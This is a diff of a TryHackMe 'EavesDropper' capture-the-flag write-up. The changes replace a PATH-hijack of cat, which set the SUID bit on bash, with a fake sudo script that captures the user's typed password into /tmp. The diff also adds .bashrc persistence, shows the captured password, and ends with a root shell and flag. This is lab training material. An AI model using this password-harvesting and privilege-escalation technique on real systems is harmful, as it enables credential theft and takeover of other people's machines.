@@ -1,5 +1,7 @@
 ### EavesDropper TryHackMe
 
+### Difficulty = Medium
+
 ### Description: Hello again, hacker. After uncovering a user Frank's SSH private key, you've broken into a target environment.
 
 We're given the ssh key to login as frank
@@ -148,28 +150,124 @@ done
 
 From the result we see there's a cron running `sudo cat /etc/shadow` 
 
-The problem is that it doesn't specify the full path to the `cat` binary
+The problem is that it doesn't specify the full path to the `sudo & cat` binary
 
-With this we can do path hijack so basically when `cat` is called it will look up where it is in the path
+With this we can do path hijack so basically when `sudo` is called it will look up where it is in the path
 
-And if we make a malicious binary named cat we can hijack the real `cat` binary
+And if we make a malicious binary named `sudo` we can hijack the real `sudo` binary
 
-Here it is
+But here's the problem we see from the process  that it's only when the user ssh to the box that the sudo command is called
+
+Therefore making the user input his password 
+
+With this i can make a script to read the input then save the password in the /tmp directory
+
+Here's the script 
+
+```
+#!/usr/bin/bash
+
+read -sp 'Password: ' Password #reads the userpass and save it in the variable password
+
+echo $Password > /tmp/passwd.txt #echos the password and save it in /tmp/passwd.txt
+```
+
+Now here's the way to go around it 😉
 
 ```
 frank@workstation:~$ cd /tmp
-frank@workstation:/tmp$ nano cat 
-frank@workstation:/tmp$ cat cat 
-chmod +s /bin/bash
-frank@workstation:/tmp$ chmod +x cat 
+frank@workstation:/tmp$ nano sudo
+frank@workstation:/tmp$ chmod +x sudo 
 frank@workstation:/tmp$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
-frank@workstation:/tmp$ export PATH=.:$PATH
+frank@workstation:/tmp$ export PATH=/tmp:$PATH
 frank@workstation:/tmp$ echo $PATH
-.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 frank@workstation:/tmp$ 
 ```
 
-Now when cat is called, it will check the path avaialble and also look it up in the /tmp directory
+After about a minute check the /tmp directory you will see the content of the user password (not)
+
+The sudo command is called when the user logins so i'll exit then login back
+
+But theres one thing that will stop us which is the PATH reset so basically the path will reset to its original value
+
+This can be fixed by putting the path in the user's .bashrc file
+
+The .bashrc file is a script file that's executed when a user logs in
+
+```
+frank@workstation:~$ echo $PATH
+.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+frank@workstation:~$ nano .bashrc
+frank@workstation:~$ cat .bashrc | head
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+PATH=/home/frank:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+frank@workstation:~$ 
+```
+
+With this i'll exit and login back
+
+```
+┌──(venv)─(mark㉿haxor)-[~/Desktop/B2B/THM/Eavesdropper]
+└─$ ssh -i idrsa.id-rsa frank@10.10.244.20
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-96-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Sun Feb  5 15:11:15 2023 from 172.18.0.2
+frank@workstation:~$ ls /tmp
+passwd.txt  pspy64
+frank@workstation:~$ cat /tmp/passwd.txt 
+!@#frankisawesome2022%*
+frank@workstation:~$ 
+```
+
+Boom! We get it :)
+
+With this i'll su to root but we need to specify the full path of sudo binary cause we messed with it already
+
+```
+frank@workstation:~$ /usr/bin/sudo su
+[sudo] password for frank: 
+root@workstation:/home/frank# cd
+root@workstation:~# ls
+flag.txt
+root@workstation:~# cat flag.txt 
+flag{14370304172628f784d8e8962d54a600}
+root@workstation:~#
+```
+
+To fix the path we can do this
+
+```
+frank@workstation:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:$PATH
+frank@workstation:~$ sudo su
+root@workstation:/home/frank# cd
+root@workstation:~# ls
+flag.txt
+root@workstation:~# cat flag.txt 
+flag{14370304172628f784d8e8962d54a600}
+root@workstation:~# 
+```
+
+
+
+
+
 
 
